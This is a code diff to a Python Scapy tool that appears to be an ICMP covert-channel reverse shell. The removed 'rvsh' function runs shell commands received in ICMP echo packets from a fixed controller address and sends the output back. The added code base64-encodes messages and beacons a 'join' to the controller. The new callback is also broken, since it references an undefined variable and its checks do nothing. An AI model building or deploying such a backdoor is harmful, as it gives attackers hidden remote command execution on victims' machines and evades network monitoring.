@@ -7,6 +7,8 @@ import socket
 import psutil
 import pwd
 import base64
+from typing import Optional
+
 
 dest = "192.168.157.6"
 ICMP_ID = int(12800)
@@ -55,7 +57,9 @@ class Host:
 
         return shellpack
 
-    def send(self, shellpack) -> bool:
+    def send(self, command: str, message: str | None = None) -> bool:
+
+        shellpack = self.build_shellpack(command, message)
         encoded_shellpack = str(shellpack).encode('utf-8')
         encoded_shellpack = base64.b64encode(encoded_shellpack)
         
@@ -63,12 +67,6 @@ class Host:
         sr(data, timeout=0, verbose=0)
         
         return True
-
-    def join(self) -> bool:
-        shellpack = self.build_shellpack("join", None)
-        self.send(shellpack)
-        return True
-
 
     def __str__(self) -> str:
         report =  f"[ Host Information ]\n"
@@ -78,28 +76,36 @@ class Host:
 
         return report
 
-def rvsh(pkt):
-    if pkt[IP].src == dest and pkt[ICMP].type == 8 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
-        icmppaket = (pkt[Raw].load).decode('utf-8', errors='ignore')
-        payload = os.popen(icmppaket).readlines()
-        icmppacket = (IP(dst=dest, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload))
-        sr(icmppacket, timeout=0, verbose=0)
-    else:
+def sniff_callback(pkt):
+    
+    if packet[IP].src != dest:
         pass
+
+    if packet[ICMP].type != 8:
+        pass
+
+    if packet[ICMP].id != ICMP_ID:
+        pass
+
+    if not packet[Raw].load:
+        pass
+
+
+    encoded_shellpack = (pkt[Raw].load).decode('utf-8', errors='ignore')
+    shellpack = base64.b64decode(encoded_shellpack)
+    print(shellpack)
 
 def setup_host() -> Host:
     print("[ Setting up host... ]")
     host = Host()
     print(host)
-
+    
     # Send join command
-    #join = (IP(dst=dest, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load="join"))
-    #sr(join, timeout=0, verbose=0)
-    host.join()
+    host.send(command="join") 
 
     return host
 
 if __name__ == "__main__":
     host = setup_host()
     print("[ ICMP Sniffing Started ]")
-    sniff(iface=host.iface, prn=rvsh, filter="icmp", store="0")
+    sniff(iface=host.iface, prn=sniff_callback, filter="icmp", store="0")
